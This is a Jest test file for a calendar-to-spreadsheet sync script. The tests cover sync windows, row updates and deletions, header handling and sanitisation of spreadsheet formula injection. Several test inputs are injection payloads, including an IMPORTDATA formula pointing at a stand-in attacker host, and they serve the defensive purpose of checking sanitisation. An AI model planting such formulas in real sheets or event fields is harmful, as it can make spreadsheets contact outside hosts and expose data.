  test('syncCalendarToSheetGAS handles empty SYNC_CONFIGS gracefully', () => {
    const code = require('../code.gs');
    
    // Set empty SYNC_CONFIGS
    delete global.SYNC_CONFIGS;
    global.SYNC_CONFIGS = [];
    
    // This should not throw even with empty SYNC_CONFIGS
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ 
      id: 'e_empty_cfg', 
      title: 'Empty Config Test', 
      start: new Date('2026-02-02T10:00:00Z'), 
      end: new Date('2026-02-02T11:00:00Z'), 
      description: '', 
      location: '', 
      attendees: [] 
    });
    calendar.__addEvent(evt);

    // Should not throw
    expect(() => {
      code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
    }).not.toThrow();

    // Should still sync to the default spreadsheet/sheet
    expect(sheet.__getRows().find(r => r[0] === 'e_empty_cfg')).toBeTruthy();
    
    delete global.SYNC_CONFIGS;
  });

  test('syncAllCalendarsToSheetsGAS handles empty SYNC_CONFIGS gracefully', () => {
    const code = require('../code.gs');
    
    // Set empty SYNC_CONFIGS
    delete global.SYNC_CONFIGS;
    global.SYNC_CONFIGS = [];
    
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ 
      id: 'e_empty_all', 
      title: 'Empty All Test', 
      start: new Date('2026-02-02T10:00:00Z'), 
      end: new Date('2026-02-02T11:00:00Z'), 
      description: '', 
      location: '', 
      attendees: [] 
    });
    calendar.__addEvent(evt);

    // Should not throw
    expect(() => {
      code.syncAllCalendarsToSheetsGAS('2026-02-01', '2026-02-03');
    }).not.toThrow();

    // Should still sync to the default spreadsheet/sheet
    expect(sheet.__getRows().find(r => r[0] === 'e_empty_all')).toBeTruthy();
    
    delete global.SYNC_CONFIGS;
  });

  test('getCheckpointKey handles default calendar', () => {
    const code = require('../code.gs');
    const cfg = { calendarId: null };
    const key = code.getCheckpointKey(cfg);
    expect(key).toBe('calendar_to_sheets_last_sync_default');
  });

  test('_syncCalendarToSheetGAS skips update when row values are identical', () => {
    const code = require('../code.gs');
    
    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ 
      id: 'e_same', 
      title: 'Same Event', 
      start: new Date('2026-02-02T10:00:00Z'), 
      end: new Date('2026-02-02T11:00:00Z'), 
      description: 'desc', 
      location: 'loc', 
      attendees: ['a@example.com'] 
    });
    calendar.__addEvent(evt);

    // First sync
    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
    const rowsBefore = sheet.__getRows();
    
    // Second sync with same data (should not update)
    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
    const rowsAfter = sheet.__getRows();
    
    expect(rowsAfter).toEqual(rowsBefore);
    
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
  });

  test('_syncCalendarToSheetGAS deletes rows for removed events', () => {
    const code = require('../code.gs');
    
    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt1 = createCalendarEvent({ id: 'e_del1', title: 'Event 1', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z'), description: '', location: '', attendees: [] });
    const evt2 = createCalendarEvent({ id: 'e_del2', title: 'Event 2', start: new Date('2026-02-02T12:00:00Z'), end: new Date('2026-02-02T13:00:00Z'), description: '', location: '', attendees: [] });
    calendar.__addEvent(evt1);
    calendar.__addEvent(evt2);

    // First sync with both events
    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
    expect(sheet.__getRows().length).toBe(2);
    
    // Remove one event and sync again
    calendar.__reset();
    calendar.__addEvent(evt1);
    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
    
    const rows = sheet.__getRows();
    expect(rows.length).toBe(1);
    expect(rows[0][0]).toBe('e_del1');
    
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
  });

  test('_syncCalendarToSheetGAS skips empty rows and deletes removed events', () => {
    const code = require('../code.gs');

    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';

    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);

    sheet.__getRows().push([]);

    const calendar = CalendarApp.getDefaultCalendar();
    const evt1 = createCalendarEvent({ id: 'e_skip', title: 'Skip Test', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z') });
    calendar.__addEvent(evt1);

    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');

    calendar.__reset();
    const deleteRowSpy = jest.spyOn(sheet, 'deleteRow');
    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
    expect(deleteRowSpy).toHaveBeenCalled();

    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
  });

  test('syncAllCalendarsToSheetsGAS logs errors when Logger is available', () => {
    const code = require('../code.gs');
    
    // Create a mock that will throw an error
    const originalOpenById = SpreadsheetApp.openById;
    SpreadsheetApp.openById = jest.fn(() => {
      throw new Error('Spreadsheet not found');
    });
    
    global.SYNC_CONFIGS = [
      { spreadsheetId: 'invalid_ss', sheetName: 'BadSheet', calendarId: 'bad_cal' }
    ];
    
    global.Logger = { log: jest.fn() };
    
    // This should trigger an error but not throw
    code.syncAllCalendarsToSheetsGAS('2026-02-01', '2026-02-03');
    
    // Logger should have been called with error
    expect(global.Logger.log).toHaveBeenCalled();
    expect(global.Logger.log.mock.calls[0][0]).toContain('Error syncing calendar');
    
    // Restore
    SpreadsheetApp.openById = originalOpenById;
    delete global.SYNC_CONFIGS;
    delete global.Logger;
  });

  test('_syncCalendarToSheetGAS uses getActiveSpreadsheet when spreadsheetId is null', () => {
    const code = require('../code.gs');
    
    global.SYNC_CONFIGS = [{ spreadsheetId: null, sheetName: 'Sheet1', calendarId: null }];
    
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ id: 'e_active', title: 'Active SS Test', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z'), description: '', location: '', attendees: [] });
    calendar.__addEvent(evt);

    code.syncAllCalendarsToSheetsGAS('2026-02-01', '2026-02-03');

    expect(sheet.__getRows().find(r => r[0] === 'e_active')).toBeTruthy();
    
    delete global.SYNC_CONFIGS;
  });

  test('_syncCalendarToSheetGAS creates named sheet when missing', () => {
    const code = require('../code.gs');
    
    global.SYNC_CONFIGS = [{ spreadsheetId: 'ss1', sheetName: 'NonExistent', calendarId: null }];
    
    const ss = SpreadsheetApp.openById('ss1');
    // Mock getSheetByName to return null for NonExistent sheet to force creation
    const originalGetSheetByName = ss.getSheetByName.bind(ss);
    const originalInsertSheet = ss.insertSheet.bind(ss);
    const insertSheetSpy = jest.fn((name) => originalInsertSheet(name));
    ss.getSheetByName = (name) => (name === 'NonExistent' ? null : originalGetSheetByName(name));
    ss.insertSheet = insertSheetSpy;
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ id: 'e_fallback', title: 'Fallback Test', start: new Date('2026-02-02T10:00:00Z'), end: new Date('2026-02-02T11:00:00Z'), description: '', location: '', attendees: [] });
    calendar.__addEvent(evt);

    code.syncAllCalendarsToSheetsGAS('2026-02-01', '2026-02-03');

    expect(insertSheetSpy).toHaveBeenCalledWith('NonExistent');
    const createdSheet = insertSheetSpy.mock.results[0].value;
    expect(createdSheet.__getRows().find(r => r[0] === 'e_fallback')).toBeTruthy();
    
    ss.getSheetByName = originalGetSheetByName;
    ss.insertSheet = originalInsertSheet;
    delete global.SYNC_CONFIGS;
  });

  test('eventToRowGAS handles missing description and location', () => {
    const code = require('../code.gs');
    const evt = createCalendarEvent({ 
      id: 'e_minimal', 
      title: 'Minimal Event', 
      start: new Date('2026-02-02T10:00:00Z'), 
      end: new Date('2026-02-02T11:00:00Z'), 
      description: null, 
      location: null, 
      attendees: null 
    });
    
    const row = code.eventToRowGAS(evt);
    
    expect(row[4]).toBe(''); // description
    expect(row[5]).toBe(''); // location
    expect(row[6]).toBe(''); // attendees
  });

  test('incremental sync preserves historical events outside sync window', () => {
    const code = require('../code.gs');
    
    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    
    // Create events in different time windows
    const oldEvent = createCalendarEvent({ 
      id: 'e_old', 
      title: 'Old Event', 
      start: new Date('2025-01-15T10:00:00Z'), 
      end: new Date('2025-01-15T11:00:00Z'), 
      description: '', 
      location: '', 
      attendees: [] 
    });
    
    const recentEvent = createCalendarEvent({ 
      id: 'e_recent', 
      title: 'Recent Event', 
      start: new Date('2026-02-02T10:00:00Z'), 
      end: new Date('2026-02-02T11:00:00Z'), 
      description: '', 
      location: '', 
      attendees: [] 
    });
    
    // Add both events and do a full sync
    calendar.__addEvent(oldEvent);
    calendar.__addEvent(recentEvent);
    code.syncCalendarToSheetGAS('2025-01-01', '2026-03-01');
    
    expect(sheet.__getRows().length).toBe(2);
    
    // Now simulate an incremental sync from Feb 1 onwards
    // The old event (Jan 2025) is NOT deleted from calendar, but it's outside the sync window
    calendar.__reset();
    calendar.__addEvent(oldEvent); // still exists in calendar
    calendar.__addEvent(recentEvent); // still exists in calendar
    
    // Sync only Feb-March window
    code.syncCalendarToSheetGAS('2026-02-01', '2026-03-01');
    
    // Both events should still be in the sheet
    const rows = sheet.__getRows();
    expect(rows.length).toBe(2);
    expect(rows.find(r => r[0] === 'e_old')).toBeTruthy();
    expect(rows.find(r => r[0] === 'e_recent')).toBeTruthy();
    
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
  });

  test('incremental sync deletes events within sync window but preserves those outside', () => {
    const code = require('../code.gs');
    
    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    
    // Create events in different time windows
    const oldEvent = createCalendarEvent({ 
      id: 'e_old', 
      title: 'Old Event', 
      start: new Date('2025-01-15T10:00:00Z'), 
      end: new Date('2025-01-15T11:00:00Z'), 
      description: '', 
      location: '', 
      attendees: [] 
    });
    
    const recentEvent1 = createCalendarEvent({ 
      id: 'e_recent1', 
      title: 'Recent Event 1', 
      start: new Date('2026-02-02T10:00:00Z'), 
      end: new Date('2026-02-02T11:00:00Z'), 
      description: '', 
      location: '', 
      attendees: [] 
    });
    
    const recentEvent2 = createCalendarEvent({ 
      id: 'e_recent2', 
      title: 'Recent Event 2', 
      start: new Date('2026-02-03T10:00:00Z'), 
      end: new Date('2026-02-03T11:00:00Z'), 
      description: '', 
      location: '', 
      attendees: [] 
    });
    
    // Add all events and do a full sync
    calendar.__addEvent(oldEvent);
    calendar.__addEvent(recentEvent1);
    calendar.__addEvent(recentEvent2);
    code.syncCalendarToSheetGAS('2025-01-01', '2026-03-01');
    
    expect(sheet.__getRows().length).toBe(3);
    
    // Now delete recentEvent2 from calendar and do incremental sync
    // The old event should remain, recentEvent1 should remain, recentEvent2 should be deleted
    calendar.__reset();
    calendar.__addEvent(oldEvent);
    calendar.__addEvent(recentEvent1);
    // recentEvent2 is deleted from calendar
    
    // Sync only Feb-March window
    code.syncCalendarToSheetGAS('2026-02-01', '2026-03-01');
    
    // Old event should be preserved (outside window), recentEvent1 kept, recentEvent2 deleted
    const rows = sheet.__getRows();
    expect(rows.length).toBe(2);
    expect(rows.find(r => r[0] === 'e_old')).toBeTruthy();
    expect(rows.find(r => r[0] === 'e_recent1')).toBeTruthy();
    expect(rows.find(r => r[0] === 'e_recent2')).toBeUndefined();
    
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
  });

  test('incremental sync sanitizes formula injection in title, description, and location', () => {
    const code = require('../code.gs');
    
    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({
      id: 'e_safe',
      title: '=MALICIOUS()',
      start: new Date('2026-02-02T10:00:00Z'),
      end: new Date('2026-02-02T11:00:00Z'),
      description: '@IMPORTDATA("http://evil.com")',
      location: '+DANGEROUS',
      attendees: []
    });
    calendar.__addEvent(evt);

    code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
    
    const rows = sheet.__getRows();
    expect(rows.length).toBe(1);
    expect(rows[0][1]).toBe("'=MALICIOUS()"); // title sanitized
    expect(rows[0][4]).toBe("'@IMPORTDATA(\"http://evil.com\")"); // description sanitized
    expect(rows[0][5]).toBe("'+DANGEROUS"); // location sanitized
    
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
  });
});

// Test ensureHeader function
describe('ensureHeader', () => {
  const { ensureHeader } = require('../src/index');

  test('ensureHeader creates header when sheet is completely empty', () => {
    const mockSetValues = jest.fn();
    const sheet = {
      getDataRange: () => ({ getValues: () => [] }),
      appendRow: jest.fn(),
      insertRowBefore: jest.fn(),
      getRange: jest.fn(() => ({ setValues: mockSetValues }))
    };

    ensureHeader(sheet);
    
    expect(sheet.getRange).toHaveBeenCalledWith(1, 1, 1, 7);
    expect(mockSetValues).toHaveBeenCalledWith([['id', 'title', 'start', 'end', 'description', 'location', 'attendees']]);
    expect(sheet.insertRowBefore).not.toHaveBeenCalled();
  });

  test('ensureHeader does nothing when valid header already exists', () => {
    const sheet = {
      getDataRange: () => ({ getValues: () => [['id', 'title', 'start', 'end', 'description', 'location', 'attendees']] }),
      appendRow: jest.fn(),
      insertRowBefore: jest.fn(),
      getRange: jest.fn(() => ({ setValues: jest.fn() }))
    };

    ensureHeader(sheet);
    
    expect(sheet.appendRow).not.toHaveBeenCalled();
    expect(sheet.insertRowBefore).not.toHaveBeenCalled();
  });

  test('ensureHeader inserts header when first row is data not header', () => {
    const mockSetValues = jest.fn();
    const sheet = {
      getDataRange: () => ({ getValues: () => [['e1', 'Meeting', '2026-02-02T10:00:00Z', '2026-02-02T11:00:00Z', 'desc', 'loc', 'attendees']] }),
      appendRow: jest.fn(),
      insertRowBefore: jest.fn(),
      getRange: jest.fn(() => ({ setValues: mockSetValues }))
    };

    ensureHeader(sheet);
    
    expect(sheet.insertRowBefore).toHaveBeenCalledWith(1);
    expect(sheet.getRange).toHaveBeenCalledWith(1, 1, 1, 7);
    expect(mockSetValues).toHaveBeenCalledWith([['id', 'title', 'start', 'end', 'description', 'location', 'attendees']]);
  });

  test('sheet mock: insertRowBefore+setValues preserves data when adding header to sheet with existing rows', () => {
    // This test verifies the fix for the bug where inserting a header into a sheet
    // with existing data rows would overwrite the first data row
    const ss = SpreadsheetApp.openById('test-ss');
    const sheet = ss.getSheetByName('TestSheet');
    
    // Add data rows without a header
    sheet.appendRow(['data1-col1', 'data1-col2', 'data1-col3']);
    sheet.appendRow(['data2-col1', 'data2-col2', 'data2-col3']);
    
    // Verify initial state: 2 data rows, no header
    let dataRange = sheet.getDataRange().getValues();
    expect(dataRange).toEqual([
      ['data1-col1', 'data1-col2', 'data1-col3'],
      ['data2-col1', 'data2-col2', 'data2-col3']
    ]);
    expect(sheet.getLastRow()).toBe(2);
    
    // Now insert a header (this is what ensureHeader does)
    sheet.insertRowBefore(1);
    sheet.getRange(1, 1, 1, 3).setValues([['Header1', 'Header2', 'Header3']]);
    
    // Verify the header was added and data was preserved
    dataRange = sheet.getDataRange().getValues();
    expect(dataRange).toEqual([
      ['Header1', 'Header2', 'Header3'],
      ['data1-col1', 'data1-col2', 'data1-col3'],
      ['data2-col1', 'data2-col2', 'data2-col3']
    ]);
    expect(sheet.getLastRow()).toBe(3);
  });
});

// Test syncCalendarToSheet with empty sheet (no header)
test('syncCalendarToSheet works correctly when sheet starts empty with no header', async () => {
  const calendar = CalendarApp.getDefaultCalendar();
  
  // Create a fresh sheet with no header set
  const ss = SpreadsheetApp.openById('ss_empty');
  const sheet = ss.getSheetByName('EmptySheet');
  // Intentionally NOT calling __setHeader

  const evt1 = createCalendarEvent({ 
    id: 'e_empty1', 
    title: 'First Event', 
    start: new Date('2026-02-02T10:00:00Z'), 
    end: new Date('2026-02-02T11:00:00Z'), 
    description: 'd1', 
    location: 'L1', 
    attendees: ['a@example.com'] 
  });
  
  const evt2 = createCalendarEvent({ 
    id: 'e_empty2', 
    title: 'Second Event', 
    start: new Date('2026-02-03T10:00:00Z'), 
    end: new Date('2026-02-03T11:00:00Z'), 
    description: 'd2', 
    location: 'L2', 
    attendees: [] 
  });
  
  calendar.__addEvent(evt1);
  calendar.__addEvent(evt2);

  // Sync should create header and add events
  await syncCalendarToSheet(calendar, sheet, { start: new Date('2026-02-01'), end: new Date('2026-02-05') });

  const rows = sheet.__getRows();
  expect(rows.length).toBe(2);
  expect(rows[0][0]).toBe('e_empty1');
  expect(rows[1][0]).toBe('e_empty2');
  
  // Second sync should update correctly without duplicating
  const evt1Updated = createCalendarEvent({ 
    id: 'e_empty1', 
    title: 'First Event Updated', 
    start: new Date('2026-02-02T10:00:00Z'), 
    end: new Date('2026-02-02T11:00:00Z'), 
    description: 'd1', 
    location: 'L1', 
    attendees: ['a@example.com'] 
  });
  
  calendar.__reset();
  calendar.__addEvent(evt1Updated);
  calendar.__addEvent(evt2);

  await syncCalendarToSheet(calendar, sheet, { start: new Date('2026-02-01'), end: new Date('2026-02-05') });

  const rows2 = sheet.__getRows();
  expect(rows2.length).toBe(2);
  const e1row = rows2.find(r => r[0] === 'e_empty1');
  expect(e1row[1]).toBe('First Event Updated');
});

// Test formula injection sanitization
test('eventToRow sanitizes values starting with formula metacharacters', () => {
  const evt = createCalendarEvent({ 
    id: 'e_formula', 
    title: '=SUM(A1:A10)', 
    start: new Date('2026-02-02T10:00:00Z'), 
    end: new Date('2026-02-02T11:00:00Z'), 
    description: '+ALERT()', 
    location: '-cmd', 
    attendees: [] 
  });
  
  const row = eventToRow(evt);
  
  expect(row[1]).toBe("'=SUM(A1:A10)"); // title sanitized
  expect(row[4]).toBe("'+ALERT()"); // description sanitized
  expect(row[5]).toBe("'-cmd"); // location sanitized
});

// Test formula injection sanitization with leading whitespace/control characters
test('eventToRow sanitizes values with leading whitespace/control chars followed by formula metacharacters', () => {
  const evt = createCalendarEvent({ 
    id: 'e_whitespace_formula', 
    title: ' =IMPORTDATA("http://evil.com")', 
    start: new Date('2026-02-02T10:00:00Z'), 
    end: new Date('2026-02-02T11:00:00Z'), 
    description: '\t@IMPORTDATA("http://evil.com")', 
    location: '\n+DANGEROUS', 
    attendees: [] 
  });
  
  const row = eventToRow(evt);
  
  expect(row[1]).toBe("' =IMPORTDATA(\"http://evil.com\")"); // title with leading space sanitized
  expect(row[4]).toBe("'\t@IMPORTDATA(\"http://evil.com\")"); // description with leading tab sanitized
  expect(row[5]).toBe("'\n+DANGEROUS"); // location with leading newline sanitized
});

// Test that normal values with dangerous chars in middle are not sanitized
test('eventToRow does not sanitize values with formula chars not at effective start', () => {
  const evt = createCalendarEvent({ 
    id: 'e_safe', 
    title: 'Meeting @3pm', 
    start: new Date('2026-02-02T10:00:00Z'), 
    end: new Date('2026-02-02T11:00:00Z'), 
    description: 'Cost is $100+tax', 
    location: 'Room 5-A', 
    attendees: [] 
  });
  
  const row = eventToRow(evt);
  
  expect(row[1]).toBe('Meeting @3pm'); // not sanitized
  expect(row[4]).toBe('Cost is $100+tax'); // not sanitized
  expect(row[5]).toBe('Room 5-A'); // not sanitized
});

// Test historical data preservation (no valid dates)
test('syncCalendarToSheet preserves rows without valid date columns', async () => {
  const calendar = CalendarApp.getDefaultCalendar();
  const ss = SpreadsheetApp.openById('ss1');
  const sheet = ss.getSheetByName('Sheet1');

  // Add a row with missing date columns (historical data)
  sheet.__getRows().push(['old_event', 'Old Event', null, null, 'desc', 'loc', '']);

  // Sync with empty calendar
  calendar.__reset();
  await syncCalendarToSheet(calendar, sheet, { start: new Date('2026-02-01'), end: new Date('2026-02-03') });

  // Row should still exist because it has no valid dates
  const rows = sheet.__getRows();
  expect(rows.find(r => r[0] === 'old_event')).toBeTruthy();
});

// Test historical data preservation (dates outside sync window)
test('syncCalendarToSheet preserves rows with dates outside sync window', async () => {
  const calendar = CalendarApp.getDefaultCalendar();
  const ss = SpreadsheetApp.openById('ss1');
  const sheet = ss.getSheetByName('Sheet1');

  // Add a row with dates outside the sync window
  const oldDate = new Date('2025-01-01T10:00:00Z');
  sheet.__getRows().push(['old_event', 'Old Event', oldDate.toISOString(), oldDate.toISOString(), 'desc', 'loc', '']);

  // Sync with empty calendar for Feb 2026 window
  calendar.__reset();
  await syncCalendarToSheet(calendar, sheet, { start: new Date('2026-02-01'), end: new Date('2026-02-03') });

  // Row should still exist because its dates are outside the sync window
  const rows = sheet.__getRows();
  expect(rows.find(r => r[0] === 'old_event')).toBeTruthy();
});

// Test rowsEqual ignores extra columns in second argument
test('rowsEqual ignores extra columns in second argument', () => {
  // Extra columns in b are always ignored
  expect(rowsEqual(['a', 'b'], ['a', 'b', 'c'])).toBe(true);
  expect(rowsEqual(['a', 'b'], ['a', 'b', ''])).toBe(true);
  expect(rowsEqual(['a', 'b'], ['a', 'b', null])).toBe(true);
  // Works consistently when a has extra columns too
  expect(rowsEqual(['a', 'b', 'c'], ['a', 'b', 'c', 'd'])).toBe(true);
  // But if a is longer than b, it should fail (comparing against undefined)
  expect(rowsEqual(['a', 'b', 'c'], ['a', 'b'])).toBe(false);
});

// Test code.gs functions for coverage
describe('GAS wrapper functions', () => {
  beforeEach(() => {
    installGlobals(global);
  });

  afterEach(() => resetAll(global));

  test('syncCalendarToSheetGAS uses checkpoint and saves new checkpoint', async () => {
    const code = require('../code.gs');
    global.SYNC_CONFIGS = [{ calendarId: '', spreadsheetId: 'ss1', sheetName: 'Sheet1' }];
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ 
      id: 'e1', 
      title: 'Test', 
      start: new Date('2026-02-02T10:00:00Z'), 
      end: new Date('2026-02-02T11:00:00Z') 
    });
    calendar.__addEvent(evt);
    
    // Call without dates to use checkpoint logic
    await code.syncCalendarToSheetGAS();
    
    expect(sheet.__getRows().find(r => r[0] === 'e1')).toBeTruthy();
    
    delete global.SYNC_CONFIGS;
  });

  test('syncCalendarToSheetGAS with explicit dates and updates existing row', async () => {
    const code = require('../code.gs');
    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    // Add initial event
    const calendar = CalendarApp.getDefaultCalendar();
    const evt1 = createCalendarEvent({ 
      id: 'e1', 
      title: 'Initial', 
      start: new Date('2026-02-02T10:00:00Z'), 
      end: new Date('2026-02-02T11:00:00Z'),
      description: 'desc1',
      location: 'loc1',
      attendees: []
    });
    calendar.__addEvent(evt1);
    
    await code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
    
    expect(sheet.__getRows()[0][1]).toBe('Initial');
    
    // Update event title
    calendar.__reset();
    const evt2 = createCalendarEvent({ 
      id: 'e1', 
      title: 'Updated', 
      start: new Date('2026-02-02T10:00:00Z'), 
      end: new Date('2026-02-02T11:00:00Z'),
      description: 'desc1',
      location: 'loc1',
      attendees: []
    });
    calendar.__addEvent(evt2);
    
    await code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
    
    expect(sheet.__getRows()[0][1]).toBe('Updated');
    
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
  });

  test('syncCalendarToSheetGAS calls ensureHeader when available', async () => {
    const code = require('../code.gs');

    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';
    global.ensureHeader = jest.fn();

    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);

    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({
      id: 'e_header',
      title: 'Header Test',
      start: new Date('2026-02-02T10:00:00Z'),
      end: new Date('2026-02-02T11:00:00Z')
    });
    calendar.__addEvent(evt);

    await code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');

    expect(global.ensureHeader).toHaveBeenCalledWith(sheet);

    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
    delete global.ensureHeader;
  });

  test('syncCalendarToSheetGAS handles event deletion', async () => {
    const code = require('../code.gs');
    global.SPREADSHEET_ID = 'ss1';
    global.SHEET_NAME = 'Sheet1';
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt1 = createCalendarEvent({ 
      id: 'e1', 
      title: 'ToBeDeleted', 
      start: new Date('2026-02-02T10:00:00Z'), 
      end: new Date('2026-02-02T11:00:00Z')
    });
    calendar.__addEvent(evt1);
    
    await code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
    expect(sheet.__getRows().length).toBe(1);
    
    // Remove event from calendar
    calendar.__reset();
    
    await code.syncCalendarToSheetGAS('2026-02-01', '2026-02-03');
    expect(sheet.__getRows().length).toBe(0);
    
    delete global.SPREADSHEET_ID;
    delete global.SHEET_NAME;
  });

  test('syncAllCalendarsToSheetsGAS handles errors and continues', async () => {
    const code = require('../code.gs');
    global.SYNC_CONFIGS = [
      { calendarId: 'bad_calendar', spreadsheetId: 'ss1', sheetName: 'Sheet1' },
      { calendarId: '', spreadsheetId: 'ss1', sheetName: 'Sheet2' }
    ];
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet1 = ss.getSheetByName('Sheet1');
    const sheet2 = ss.getSheetByName('Sheet2');
    sheet1.__setHeader(['id','title','start','end','description','location','attendees']);
    sheet2.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ 
      id: 'e1', 
      title: 'Test', 
      start: new Date('2026-02-02T10:00:00Z'), 
      end: new Date('2026-02-02T11:00:00Z') 
    });
    calendar.__addEvent(evt);
    
    // Should not throw, should continue to second config
    await code.syncAllCalendarsToSheetsGAS('2026-02-01', '2026-02-03');
    
    // Second config should succeed
    expect(sheet2.__getRows().find(r => r[0] === 'e1')).toBeTruthy();
    
    delete global.SYNC_CONFIGS;
  });

  test('fullResyncCalendarToSheetGAS clears checkpoint and resyncs', async () => {
    const code = require('../code.gs');
    global.SYNC_CONFIGS = [{ calendarId: '', spreadsheetId: 'ss1', sheetName: 'Sheet1' }];
    
    const ss = SpreadsheetApp.openById('ss1');
    const sheet = ss.getSheetByName('Sheet1');
    sheet.__setHeader(['id','title','start','end','description','location','attendees']);
    
    const calendar = CalendarApp.getDefaultCalendar();
    const evt = createCalendarEvent({ 
      id: 'e1', 
      title: 'Test', 
      start: new Date(), 
      end: new Date(Date.now() + 3600000) 
    });
    calendar.__addEvent(evt);
    
    await code.fullResyncCalendarToSheetGAS(0);
    
    expect(sheet.__getRows().find(r => r[0] === 'e1')).toBeTruthy();
    
    delete global.SYNC_CONFIGS;
  });
});
